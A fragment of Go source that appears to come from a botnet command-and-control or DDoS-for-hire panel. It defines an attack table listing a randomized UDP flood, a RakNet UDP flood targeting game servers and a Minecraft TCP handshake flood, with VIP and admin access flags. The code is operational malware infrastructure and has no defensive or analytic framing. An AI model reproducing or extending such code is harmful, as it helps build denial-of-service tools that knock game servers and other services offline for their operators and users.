...
var attackInfoLookup = map[string]AttackInfo{
	...
	"udprand": {
		ID:          15,
		Flags:       []uint8{2, 3, 4, 5, 6, 7, 25, 30},
		Description: "UDP flood with randomized packet sizes",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
	"udprak": {
		ID:          16,
		Flags:       []uint8{2, 3, 4, 5, 6, 7, 30},
		Description: "RakNet UDP flood for game servers",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
	"minecraft": {
		ID:          17,
		Flags:       []uint8{2, 3, 4, 5, 6, 7, 17, 18, 25, 30},
		Description: "Minecraft TCP flood with protocol handshake",
		Vip:         false,
		Admin:       false,
		Disabled:    "",
	},
